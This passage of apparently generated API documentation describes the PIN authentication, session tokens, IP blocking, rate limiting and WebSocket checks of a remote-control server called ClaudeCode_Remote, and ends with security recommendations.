- `true` if PIN is set and is 6 characters long
- `false` if PIN is null or invalid length

**Example**:
```javascript
if (pinManager.isPinEnabled()) {
  console.log('PIN authentication is active');
} else {
  console.log('Running in open mode (no PIN)');
}
```

##### getClientIP(req)

```javascript
getClientIP(req: ExpressRequest): String
```

**Purpose**: Extract the real client IP address from an Express request, respecting proxy headers.

**Parameters**:
- `req` (ExpressRequest): The Express request object

**Returns**: String - The client IP address

**Header priority**:
1. `cf-connecting-ip` (Cloudflare)
2. `x-real-ip` (nginx)
3. `x-forwarded-for` (standard proxy header - takes first IP)
4. `req.ip` (Express default)
5. `req.connection.remoteAddress` (direct connection)
6. `'unknown'` (fallback)

**Example**:
```javascript
const ip = pinManager.getClientIP(req);
console.log(`Request from: ${ip}`);
```

**Security note**: Takes the first IP in `x-forwarded-for` chain, which represents the actual client (not intermediate proxies).

##### isIPBlocked(ip)

```javascript
isIPBlocked(ip: String): Boolean
```

**Purpose**: Check if a specific IP address is currently blacklisted.

**Parameters**:
- `ip` (String): The IP address to check

**Returns**:
- `true` if IP is blocked
- `false` if IP is not blocked or has no record

**Example**:
```javascript
if (pinManager.isIPBlocked('192.168.1.100')) {
  console.log('IP is blocked');
}
```

##### generateSessionToken()

```javascript
generateSessionToken(): String
```

**Purpose**: Generate a cryptographically secure random session token.

**Parameters**: None

**Returns**: String - 64-character hexadecimal token (32 bytes of entropy)

**Example**:
```javascript
const token = pinManager.generateSessionToken();
// Returns: "a3f7b8c9d2e4f1a6b5c8d9e0f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1"
```

**Security**: Uses `crypto.randomBytes(32)` for strong randomness.

##### isSessionValid(token, ip)

```javascript
isSessionValid(token: String, ip: String): Boolean
```

**Purpose**: Validate a session token for a specific IP address.

**Parameters**:
- `token` (String): The session token to validate
- `ip` (String): The IP address making the request

**Returns**:
- `true` if token is valid, belongs to this IP, and not expired
- `false` if invalid, wrong IP, expired, or doesn't exist

**Side effects**:
- Deletes expired sessions from storage
- Logs IP mismatch attempts

**Example**:
```javascript
if (pinManager.isSessionValid(sessionToken, clientIP)) {
  // Allow access
} else {
  // Deny access, require re-authentication
}
```

##### attemptLogin(ip, enteredPin)

```javascript
attemptLogin(ip: String, enteredPin: String): Object
```

**Purpose**: Attempt to authenticate with a PIN from a specific IP.

**Parameters**:
- `ip` (String): The IP address attempting login
- `enteredPin` (String): The PIN provided by the user

**Returns**: Object with one of the following structures:

**Success response**:
```javascript
{
  success: true,
  token: "a3f7b8c9...",  // 64-char session token
  message: "PIN non configure - acces accorde" | undefined
}
```

**Failed response (PIN incorrect)**:
```javascript
{
  success: false,
  error: "PIN incorrect",
  attemptsRemaining: 2  // 0-2
}
```

**Blocked IP response**:
```javascript
{
  success: false,
  error: "Trop de tentatives echouees. IP bloquee pour cette session serveur.",
  blocked: true,
  attemptsRemaining: 0
}
```

**Global lockdown response**:
```javascript
{
  success: false,
  error: "Serveur en verrouillage de securite. Trop de tentatives echouees detectees.",
  lockdown: true
}
```

**Side effects**:
- Increments attempt counter for IP
- Blocks IP after 3 failed attempts
- Triggers global lockdown after threshold
- Resets attempt counter on success
- Emits events: `'login-success'`, `'login-failed'`, `'ip-blocked'`, `'security-alert'`, `'global-lockdown'`

**Example**:
```javascript
const result = pinManager.attemptLogin('192.168.1.100', '123456');
if (result.success) {
  console.log('Login successful, token:', result.token);
} else {
  console.log('Login failed:', result.error);
  if (result.attemptsRemaining !== undefined) {
    console.log(`Attempts remaining: ${result.attemptsRemaining}`);
  }
}
```

##### logout(token)

```javascript
logout(token: String): Object
```

**Purpose**: Invalidate a session token (logout).

**Parameters**:
- `token` (String): The session token to invalidate

**Returns**:
```javascript
{
  success: true  // true if token existed and was deleted
}
// or
{
  success: false  // false if token didn't exist
}
```

**Example**:
```javascript
const result = pinManager.logout(sessionToken);
if (result.success) {
  console.log('Logged out successfully');
}
```

##### getStats()

```javascript
getStats(): Object
```

**Purpose**: Get comprehensive security statistics for monitoring/debugging.

**Parameters**: None

**Returns**:
```javascript
{
  pinEnabled: Boolean,           // Is PIN auth enabled?
  globalLockdown: Boolean,       // Is global lockdown active?
  blockedIPs: Array<Object>,     // List of blocked IPs
  // Each blocked IP object:
  // {
  //   ip: String,
  //   attempts: Number,
  //   blockedAt: Date
  // }
  totalFailedAttempts: Number,   // Total failed login attempts
  distinctFailedIPs: Number,     // Number of unique IPs with failures
  activeSessions: Number         // Current active session count
}
```

**Example**:
```javascript
const stats = pinManager.getStats();
console.log(`Security Status:
  PIN: ${stats.pinEnabled ? 'Enabled' : 'Disabled'}
  Lockdown: ${stats.globalLockdown ? 'ACTIVE' : 'Inactive'}
  Blocked IPs: ${stats.blockedIPs.length}
  Failed Attempts: ${stats.totalFailedAttempts}
  Active Sessions: ${stats.activeSessions}
`);
```

##### disableLockdown()

```javascript
disableLockdown(): Object
```

**Purpose**: Manually disable global lockdown (admin action).

**Parameters**: None

**Returns**:
```javascript
{
  success: true,
  message: "Verrouillage desactive"
}
// or
{
  success: false,
  message: "Pas de verrouillage actif"
}
```

**Side effects**:
- Sets `globalLockdown` to false
- Emits `'lockdown-disabled'` event

**Example**:
```javascript
const result = pinManager.disableLockdown();
console.log(result.message);
```

**Security note**: Should only be called after investigating the attack. Consider resetting IP blacklist as well.

##### cleanupExpiredSessions()

```javascript
cleanupExpiredSessions(): Number
```

**Purpose**: Manually remove expired sessions from storage.

**Parameters**: None

**Returns**: Number - Count of sessions removed

**Example**:
```javascript
const cleaned = pinManager.cleanupExpiredSessions();
console.log(`Cleaned up ${cleaned} expired sessions`);
```

**Note**: This is also done automatically during validation, so manual calls are optional.

##### getSessionInfo(token, ip)

```javascript
getSessionInfo(token: String, ip: String): Object | null
```

**Purpose**: Get detailed information about a session (for expiration warnings).

**Parameters**:
- `token` (String): The session token
- `ip` (String): The IP address (must match session IP)

**Returns**: Object if valid, null if invalid/expired/wrong IP
```javascript
{
  authenticatedAt: Number,     // Timestamp when session was created
  expiresAt: Number,           // Timestamp when session will expire
  remainingMs: Number,         // Milliseconds until expiration
  sessionTimeout: Number       // Total session timeout duration
}
```

**Example**:
```javascript
const info = pinManager.getSessionInfo(token, ip);
if (info) {
  const minutesLeft = Math.floor(info.remainingMs / 60000);
  console.log(`Session expires in ${minutesLeft} minutes`);
}
```

##### refreshSession(token, ip)

```javascript
refreshSession(token: String, ip: String): Object
```

**Purpose**: Extend a session's lifetime without re-authentication.

**Parameters**:
- `token` (String): The session token to refresh
- `ip` (String): The IP address (must match session IP)

**Returns**:

**Success**:
```javascript
{
  success: true,
  expiresAt: Number,          // New expiration timestamp
  remainingMs: Number,        // Full session timeout duration
  message: "Session prolongee"
}
```

**Failure**:
```javascript
{
  success: false,
  error: "Token requis" | "Session introuvable" | "IP non autorisee" | "Session expiree"
}
```

**Side effects**:
- Updates `session.authenticatedAt` to current time
- Logs refresh action

**Example**:
```javascript
const result = pinManager.refreshSession(token, ip);
if (result.success) {
  console.log('Session extended for another 4 hours');
}
```

#### Events

PinManager extends EventEmitter and emits the following events:

##### Event: 'login-success'

```javascript
pinManager.on('login-success', (data) => { ... })
```

**Data**:
```javascript
{
  ip: String,           // IP that successfully logged in
  timestamp: Date       // When login occurred
}
```

##### Event: 'login-failed'

```javascript
pinManager.on('login-failed', (data) => { ... })
```

**Data**:
```javascript
{
  ip: String,                 // IP that failed login
  attempts: Number,           // Total attempts from this IP
  attemptsRemaining: Number,  // Attempts before block
  timestamp: Date
}
```

##### Event: 'ip-blocked'

```javascript
pinManager.on('ip-blocked', (data) => { ... })
```

**Data**:
```javascript
{
  ip: String,           // IP that was blocked
  attempts: Number,     // Number of attempts before block
  timestamp: Date
}
```

##### Event: 'security-alert'

```javascript
pinManager.on('security-alert', (data) => { ... })
```

**Data**:
```javascript
{
  type: 'multiple-ip-failures',
  distinctIPs: Number,        // Number of distinct IPs with failures
  totalAttempts: Number,      // Total failed attempts
  ips: Array<String>,         // List of failed IPs
  timestamp: Date,
  lockdownActivated: Boolean  // Whether lockdown was triggered
}
```

##### Event: 'global-lockdown'

```javascript
pinManager.on('global-lockdown', (data) => { ... })
```

**Data**:
```javascript
{
  reason: String,       // Why lockdown was triggered
  timestamp: Date
}
```

##### Event: 'lockdown-disabled'

```javascript
pinManager.on('lockdown-disabled', (data) => { ... })
```

**Data**:
```javascript
{
  timestamp: Date
}
```

##### Event: 'blocked-attempt'

```javascript
pinManager.on('blocked-attempt', (data) => { ... })
```

**Data**:
```javascript
{
  ip: String,           // Blocked IP attempting access
  timestamp: Date
}
```

##### Event: 'lockdown-attempt'

```javascript
pinManager.on('lockdown-attempt', (data) => { ... })
```

**Data**:
```javascript
{
  ip: String,           // IP attempting login during lockdown
  timestamp: Date
}
```

### Authentication Middleware Functions

#### pinAuthMiddleware(req, res, next)

```javascript
const pinAuthMiddleware = (req, res, next) => { ... }
```

**Purpose**: Express middleware for PIN authentication on protected routes.

**Parameters**:
- `req` (ExpressRequest): Express request object
- `res` (ExpressResponse): Express response object
- `next` (Function): Express next() callback

**Behavior**:
- If PIN not enabled: Allow immediately
- If IP blocked: Return 403
- If valid session token: Allow
- Otherwise: Return 401

**Responses**:

**Success**: Calls `next()` to continue to route handler

**IP Blocked (403)**:
```javascript
{
  error: "IP bloquee",
  message: "Trop de tentatives echouees. Cette IP est bloquee pour cette session serveur.",
  blocked: true
}
```

**Authentication Required (401)**:
```javascript
{
  error: "Authentification requise",
  pinRequired: true,
  message: "Veuillez entrer le PIN pour acceder a cette ressource"
}
```

**Token sources checked (in order)**:
1. `req.headers['x-session-token']`
2. `req.cookies?.sessionToken`

**Example usage**:
```javascript
app.get('/api/auth/stats', pinAuthMiddleware, (req, res) => {
  res.json(pinManager.getStats());
});
```

#### authMiddleware(req, res, next)

```javascript
const authMiddleware = (req, res, next) => { ... }
```

**Purpose**: Unified authentication middleware with support for additional token sources (including query params for SSE).

**Parameters**: Same as `pinAuthMiddleware`

**Differences from `pinAuthMiddleware`**:
- Also checks `req.query?.token` (for EventSource/SSE compatibility)
- Includes debug logging
- Used for most API endpoints

**Token sources checked (in order)**:
1. `req.headers['x-session-token']`
2. `req.cookies?.sessionToken`
3. `req.query?.token`

**Debug logging**:
```javascript
console.log('[AUTH DEBUG]', {
  endpoint: req.path,
  hasHeader: !!req.headers['x-session-token'],
  hasCookie: !!req.cookies?.sessionToken,
  hasQuery: !!req.query?.token,
  sessionToken: sessionToken?.substring(0, 10) + '...',
  ip
});
```

**Example usage**:
```javascript
app.get('/api/sessions', authMiddleware, async (req, res) => {
  // Protected route
});
```

### API Endpoints

#### Authentication Endpoints

##### GET /api/auth/status

**Purpose**: Check authentication status and requirements.

**Authentication**: None (public endpoint)

**Request**: None

**Response**:
```javascript
{
  pinEnabled: Boolean,        // Is PIN authentication enabled?
  authenticated: Boolean,     // Is current token valid?
  blocked: Boolean            // Is current IP blocked?
}
```

**Example**:
```javascript
const status = await fetch('/api/auth/status').then(r => r.json());
if (status.pinEnabled && !status.authenticated) {
  showLoginForm();
}
```

##### POST /api/auth/login

**Purpose**: Authenticate with PIN and receive session token.

**Authentication**: None (public endpoint)

**Rate Limit**: 5 attempts per 15 minutes (authLimiter)

**Request body**:
```javascript
{
  pin: String  // 6-digit PIN
}
```

**Response (Success - 200)**:
```javascript
{
  success: true,
  token: String,  // 64-char session token
  message: "Authentification reussie"
}
```

**Response (Failed - 400/403/429)**:
```javascript
{
  success: false,
  error: String,
  attemptsRemaining: Number,  // Optional: remaining attempts before block
  blocked: Boolean,           // Optional: true if IP blocked
  lockdown: Boolean           // Optional: true if global lockdown
}
```

**Example**:
```javascript
const response = await fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ pin: '123456' })
});

const result = await response.json();
if (result.success) {
  localStorage.setItem('sessionToken', result.token);
}
```

##### POST /api/auth/logout

**Purpose**: Invalidate current session token.

**Authentication**: None (token provided in request)

**Request headers**:
- `x-session-token`: The token to logout

**Response (200)**:
```javascript
{
  success: true,
  message: "Deconnexion reussie"
}
```

**Example**:
```javascript
await fetch('/api/auth/logout', {
  method: 'POST',
  headers: {
    'x-session-token': token
  }
});
localStorage.removeItem('sessionToken');
```

##### GET /api/auth/session-info

**Purpose**: Get information about current session (for expiration warnings).

**Authentication**: Required (x-session-token header)

**Response (Success - 200)**:
```javascript
{
  pinEnabled: true,
  sessionValid: true,
  authenticatedAt: Number,    // Timestamp
  expiresAt: Number,          // Timestamp
  remainingMs: Number,        // Milliseconds until expiration
  sessionTimeout: Number      // Total session duration
}
```

**Response (PIN disabled - 200)**:
```javascript
{
  pinEnabled: false,
  sessionValid: true,
  noExpiration: true
}
```

**Response (Invalid/Expired - 401)**:
```javascript
{
  sessionValid: false,
  error: "Session invalide ou expiree"
}
```

**Example**:
```javascript
const info = await fetch('/api/auth/session-info', {
  headers: { 'x-session-token': token }
}).then(r => r.json());

if (info.remainingMs < 5 * 60 * 1000) {
  showExpirationWarning();
}
```

##### POST /api/auth/refresh

**Purpose**: Extend session lifetime without re-authentication.

**Authentication**: Required (x-session-token header)

**Response (Success - 200)**:
```javascript
{
  success: true,
  expiresAt: Number,          // New expiration timestamp
  remainingMs: Number,        // Full session timeout
  message: "Session prolongee"
}
```

**Response (PIN disabled - 200)**:
```javascript
{
  success: true,
  noExpiration: true,
  message: "PIN non active - pas d'expiration"
}
```

**Response (Failed - 400/401)**:
```javascript
{
  success: false,
  error: String  // "Session invalide ou expiree" | "IP non autorisee"
}
```

**Example**:
```javascript
// Refresh every 30 minutes to keep session alive
setInterval(async () => {
  await fetch('/api/auth/refresh', {
    method: 'POST',
    headers: { 'x-session-token': token }
  });
}, 30 * 60 * 1000);
```

##### GET /api/auth/stats

**Purpose**: Get security statistics (for admin/debugging).

**Authentication**: Required (pinAuthMiddleware)

**Response (200)**:
```javascript
{
  pinEnabled: Boolean,
  globalLockdown: Boolean,
  blockedIPs: Array<{
    ip: String,
    attempts: Number,
    blockedAt: Date
  }>,
  totalFailedAttempts: Number,
  distinctFailedIPs: Number,
  activeSessions: Number
}
```

**Example**:
```javascript
const stats = await fetch('/api/auth/stats', {
  headers: { 'x-session-token': token }
}).then(r => r.json());

console.log(`Blocked IPs: ${stats.blockedIPs.length}`);
```

### Configuration Options

#### Environment Variables

##### CLAUDECODE_PIN

```bash
CLAUDECODE_PIN=123456
```

**Type**: String (6 digits)
**Purpose**: Set the PIN for authentication
**Required**: No (if not set, authentication is disabled)
**Priority**: Lower than CLI argument

**Example `.env` file**:
```
CLAUDECODE_PIN=123456
PORT=3000
```

#### Command-Line Arguments

##### --pin

```bash
node server.js --pin=123456
```

**Type**: String (6 digits)
**Purpose**: Set the PIN for authentication
**Priority**: Higher than environment variable

**Example**:
```bash
# Override environment variable
CLAUDECODE_PIN=111111 node server.js --pin=123456
# Uses 123456 (CLI argument wins)
```

#### PinManager Configuration

All PinManager options can be configured via constructor:

```javascript
const pinManager = new PinManager({
  pin: '123456',                      // 6-digit PIN (String)
  maxAttemptsPerIP: 3,                // Attempts before IP block (Number)
  globalAlertThreshold: 5,            // Distinct IPs before lockdown (Number)
  sessionTimeout: 4 * 60 * 60 * 1000  // Session lifetime in ms (Number)
});
```

**Defaults** (in server.js):
```javascript
const pinManager = new PinManager({
  pin: cliPin || process.env.CLAUDECODE_PIN,
  maxAttemptsPerIP: 3,
  globalAlertThreshold: 5
  // sessionTimeout uses PinManager default (4 hours)
});
```

### Security Constants

#### Rate Limiting Constants

```javascript
// Authentication rate limit
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15 minutes
  max: 5                       // 5 attempts
});

// General API rate limit
const apiLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,    // 1 minute
  max: 200                     // 200 requests
});

// Strict operations rate limit
const strictLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,    // 1 minute
  max: 10                      // 10 requests
});

// Orchestrator creation rate limit
const orchestratorCreateLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,    // 1 minute
  max: 10                      // 10 creations
});
```

#### Session Constants

```javascript
// Session timeout (default in PinManager)
const SESSION_TIMEOUT = 4 * 60 * 60 * 1000;  // 4 hours (14,400,000 ms)

// Session cache TTL (for Claude session data, not auth)
const SESSION_CACHE_TTL_MS = 5000;           // 5 seconds
```

#### Security Thresholds

```javascript
// IP blacklist threshold
const MAX_ATTEMPTS_PER_IP = 3;

// Global lockdown threshold
const GLOBAL_ALERT_THRESHOLD = 5;

// Request body size limit
const REQUEST_BODY_LIMIT = '1mb';
```

#### Token Constants

```javascript
// Session token entropy
const TOKEN_BYTES = 32;          // 32 bytes = 256 bits
const TOKEN_LENGTH = 64;         // 64 hex characters
```

### Error Codes and Responses

#### HTTP Status Codes

**200 OK**: Successful request
- Authentication successful
- Data retrieved successfully

**400 Bad Request**: Invalid request data
- Missing required fields
- Invalid PIN format

**401 Unauthorized**: Authentication required or failed
- No valid session token
- Session expired
- PIN incorrect

**403 Forbidden**: Access blocked
- IP blacklisted
- Global lockdown active

**429 Too Many Requests**: Rate limit exceeded
- Too many login attempts
- Too many API requests
- Too many sensitive operations

**500 Internal Server Error**: Server error
- Unexpected error during processing

#### Authentication Error Responses

##### PIN Incorrect

```javascript
{
  success: false,
  error: "PIN incorrect",
  attemptsRemaining: 2  // 0-2
}
```

##### IP Blocked

```javascript
{
  success: false,
  error: "Trop de tentatives echouees. IP bloquee pour cette session serveur.",
  blocked: true,
  attemptsRemaining: 0
}
```

or (middleware version):

```javascript
{
  error: "IP bloquee",
  message: "Trop de tentatives echouees. Cette IP est bloquee pour cette session serveur.",
  blocked: true
}
```

##### Global Lockdown

```javascript
{
  success: false,
  error: "Serveur en verrouillage de securite. Trop de tentatives echouees detectees.",
  lockdown: true
}
```

##### Missing PIN

```javascript
{
  error: "Le champ \"pin\" est requis"
}
```

##### Authentication Required

```javascript
{
  error: "Authentification requise",
  pinRequired: true,
  message: "Veuillez entrer le PIN pour acceder a cette ressource"
}
```

##### Session Invalid/Expired

```javascript
{
  sessionValid: false,
  error: "Session invalide ou expiree"
}
```

##### Session Refresh Failed

```javascript
{
  success: false,
  error: "Token requis" | "Session introuvable" | "IP non autorisee" | "Session expiree"
}
```

#### Rate Limit Error Responses

##### Too Many Login Attempts

```javascript
{
  error: "Trop de tentatives de connexion, réessayez dans 15 minutes"
}
```

##### Too Many API Requests

```javascript
{
  error: "Trop de requêtes, ralentissez"
}
```

##### Too Many Sensitive Operations

```javascript
{
  error: "Trop de requêtes pour cette opération sensible"
}
```

##### Too Many Orchestrator Creations

```javascript
{
  error: "Trop de creations d'orchestrateurs, ralentissez"
}
```

#### CORS Error

When CORS policy blocks a request, the browser shows:

```
Access to fetch at 'https://example.com/api/sessions' from origin 'https://evil.com'
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present.
```

Server logs:
```
[Security] Blocked CORS request from origin: https://evil.com
```

### Event System

#### Server-Side Event Broadcasting

Events are broadcast to WebSocket clients:

```javascript
// IP blocked
broadcastToClients({
  type: 'security-ip-blocked',
  ip: String,
  attempts: Number,
  timestamp: ISO8601String
});

// Security alert
broadcastToClients({
  type: 'security-alert',
  alertType: 'multiple-ip-failures',
  distinctIPs: Number,
  totalAttempts: Number,
  lockdownActivated: Boolean,
  timestamp: ISO8601String
});

// Global lockdown
broadcastToClients({
  type: 'global-lockdown',
  reason: String,
  message: String,
  timestamp: ISO8601String
});

// Login failed
broadcastToClients({
  type: 'security-login-failed',
  ip: String,
  attemptsRemaining: Number,
  timestamp: ISO8601String
});
```

#### WebSocket Authentication

WebSocket connections are also authenticated:

```javascript
// Client connects with token in query param
const ws = new WebSocket('ws://localhost:3000?token=abc123...');

// Server validates token
wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const token = url.searchParams.get('token');
  const ip = pinManager.getClientIP(req);

  if (pinManager.isPinEnabled()) {
    if (!token || !pinManager.isSessionValid(token, ip)) {
      ws.close(4001, 'Unauthorized - Invalid or missing session token');
      return;
    }
  }

  // Connection authenticated
});
```

#### WebSocket Connection Message

Upon successful connection:

```javascript
{
  type: 'connected',
  message: 'Connecte au serveur ClaudeCode_Remote',
  pinEnabled: Boolean,
  timestamp: ISO8601String
}
```

---

## TODO Comments Found

No TODO comments were found related to authentication or security in the analyzed files.

---

## Security Recommendations

Based on the analysis, here are recommendations for improving the security system:

1. **Add constant-time comparison for PIN**: Mitigate timing attacks by using `crypto.timingSafeEqual()`

2. **Persist IP blacklist**: Consider persisting blocked IPs to survive server restarts

3. **Add session refresh on activity**: Automatically extend sessions when user is active (already implemented)

4. **Remove 'unsafe-inline' from CSP**: Refactor inline scripts/styles to use nonces or external files

5. **Add HTTPS enforcement**: Add middleware to redirect HTTP to HTTPS (or document reverse proxy requirement)

6. **Add httpOnly cookie option**: When using cookies, set httpOnly flag server-side

7. **Add password complexity**: Consider allowing alphanumeric PINs instead of only digits for stronger security

8. **Add 2FA support**: For high-security deployments, consider TOTP-based 2FA

9. **Add audit logging**: Log all authentication events to external file/service for forensics

10. **Add IP whitelist option**: For production, allow configuring specific allowed IPs

---

## File Paths

**Analyzed Files**:
- `C:\Users\lescu\Desktop\Projects\ClaudeCode_Remote\backend\pin-manager.js`
- `C:\Users\lescu\Desktop\Projects\ClaudeCode_Remote\backend\server.js`

**Related Files** (not analyzed in detail):
- `C:\Users\lescu\Desktop\Projects\ClaudeCode_Remote\backend\command-injector\cdp-controller.js`
- `C:\Users\lescu\Desktop\Projects\ClaudeCode_Remote\public\app.js` (frontend authentication logic)

---

## Conclusion

The ClaudeCode_Remote authentication system implements a comprehensive, multi-layered security approach combining PIN authentication, session tokens, IP blacklisting, rate limiting, and security headers. The system is designed to be secure by default while remaining simple to deploy and operate. Key strengths include defense-in-depth architecture, global attack detection, and automatic session management. The primary limitation is the in-memory storage model, which is intentional for simplicity but means sessions don't persist across restarts.

For production deployments, it's recommended to:
1. Always enable PIN authentication
2. Use a reverse proxy with TLS (HTTPS)
3. Monitor security events via WebSocket broadcasts
4. Regularly review blocked IPs and lockdown events
5. Consider implementing additional recommendations listed above

---

**Documentation Generated**: 2026-01-18
**Total Lines Analyzed**: ~4,500 lines
**Completion Status**: ✓ Complete
